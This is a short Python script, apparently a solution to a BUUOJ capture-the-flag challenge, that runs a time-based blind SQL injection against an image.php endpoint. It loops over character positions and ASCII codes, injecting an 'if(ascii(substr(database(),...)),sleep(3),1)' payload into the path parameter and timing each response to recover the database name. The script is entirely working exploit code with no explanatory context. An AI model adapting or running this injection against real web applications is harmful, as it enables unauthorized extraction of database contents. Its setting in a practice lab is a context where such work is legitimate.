import requests,time

characters = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'    #匹配用的字符串
if __name__ == "__main__":
    url = "http://14a678dd-8d56-406a-986a-bbbcea37ceb3.node3.buuoj.cn/image.php?id=\\0&path="
    result=""
    for i in range(1,23):
        for character in range(32,127):
            
            # payload = {
            #     "id":"\\0",
                # "path":"+or+1=if(ascii(substr(database(),{},1))={},sleep(3),1)#".format(i,character)
                
            # }
            path="+or+1%3dif(ascii(substr(database(),{},1))%3d{},sleep(3),1)%23".format(i,character)
            # print(url+path)
            startTime = time.time()
            requests.get(url=url+path)
            endTime = time.time()
            if(endTime-startTime > 3):
                result+=chr(character)
                print(result)
                break
            print("end")
    # requests
    pass